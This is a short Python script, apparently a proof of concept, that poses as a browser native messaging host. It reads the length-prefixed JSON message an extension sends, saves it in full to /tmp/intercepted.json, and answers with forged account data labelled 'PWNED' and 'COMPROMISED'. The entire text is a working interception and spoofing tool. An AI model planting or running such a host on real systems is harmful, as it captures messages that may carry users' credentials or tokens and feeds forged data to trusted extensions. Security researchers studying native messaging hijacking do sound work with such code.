#!/usr/bin/env python3
import sys, struct, json

len_bytes = sys.stdin.buffer.read(4)
msg_len = struct.unpack("<I", len_bytes)[0]
msg = json.loads(sys.stdin.buffer.read(msg_len))

with open("/tmp/intercepted.json", "w") as f:
    json.dump(msg, f, indent=2)

response = {
    "callbackId": msg.get("callbackId"),
    "response": {"accounts": [{"id": "PWNED", "email": "COMPROMISED"}]}
}
resp_bytes = json.dumps(response).encode()
sys.stdout.buffer.write(struct.pack("<I", len(resp_bytes)))
sys.stdout.buffer.write(resp_bytes)
sys.stdout.buffer.flush()
